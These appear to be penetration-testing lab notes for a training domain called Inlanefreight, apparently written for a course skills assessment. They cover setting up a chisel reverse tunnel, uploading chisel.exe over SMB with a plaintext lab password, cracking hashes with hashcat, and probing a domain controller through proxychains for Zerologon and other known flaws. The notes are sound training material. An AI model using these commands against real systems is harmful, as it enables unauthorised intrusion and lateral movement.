


### Getting chisel

```bash
[!bash!]$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz -O chisel.gz -q
[!bash!]$ gunzip -d chisel.gz
[!bash!]$ chmod +x chisel
[!bash!]$ ./chisel server --reverse
```


```bash
[!bash!]$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_windows_amd64.gz -O chisel.exe.gz -q
[!bash!]$ gunzip -d chisel.exe.gz
[!bash!]$ crackmapexec smb 10.129.204.133 -u grace -p Inlanefreight01! --put-file ./chisel.exe \\Windows\\Temp\\chisel.exe 
```



### Cracking with hashcat

```bash
hashcat64 -m 5600 hashes\hash.txt password_list.txt -o cracked\cracked.txt
```

### Check point


Check if some target is vulnerable to some CVE or another way to get access


❯ crackmapexec smb -L | grep "CVE"
[*] nopac                     Check if the DC is vulnerable to CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user
[*] zerologon                 Module to check if the DC is vulnerable to Zerologon aka CVE-2020-1472
❯ crackmapexec smb -L | grep -i "vulnerable"
[*] dfscoerce                 Module to check if the DC is vulnerable to DFSCocerc, credit to @filip_dragovic/@Wh04m1001 and @topotam
[*] nopac                     Check if the DC is vulnerable to CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user
[*] petitpotam                Module to check if the DC is vulnerable to PetitPotam, credit to @topotam
[*] printnightmare            Check if host vulnerable to printnightmare
[*] shadowcoerce              Module to check if the target is vulnerable to ShadowCoerce, credit to @Shutdown and @topotam
[*] zerologon                 Module to check if the DC is vulnerable to Zerologon aka CVE-2020-1472



### SkillAssesments

adding to the /etc/hosts


172.16.15.3 dc01.inlanefreight.local dc01 inlanefreight inlanefreight.local


Getting the rid-brute usersnames and trying to make a bruteforce users


❯ proxychains -q crackmapexec ldap dc01.inlanefreight.local --users
SMB         172.16.15.3     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
❯ proxychains -q crackmapexec ldap dc01.inlanefreight.local --users
SMB         172.16.15.3     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
❯ proxychains -q crackmapexec ldap dc01.inlanefreight.local --groups
SMB         172.16.15.3     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)


❯ proxychains -q crackmapexec smb 172.16.15.3 -u '' -p '' --kerberos --shares
SMB         172.16.15.3     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.15.3     445    DC01             [-] CCache Error: invalid principal syntax
SMB         172.16.15.3     445    DC01             [-] Error enumerating shares: STATUS_USER_SESSION_DELETED


❯ proxychains -q crackmapexec smb 172.16.15.3 -u '' -p '' -M Zerologon
SMB         172.16.15.3     445    NONE             [*]  x64 (name:) (domain:) (signing:True) (SMBv1:False)
SMB         172.16.15.3     445    NONE             [+] \:
ZEROLOGO... 172.16.15.3     445    NONE             [-] Error while connecting to host: DCERPCException, which means this is probably not a DC!



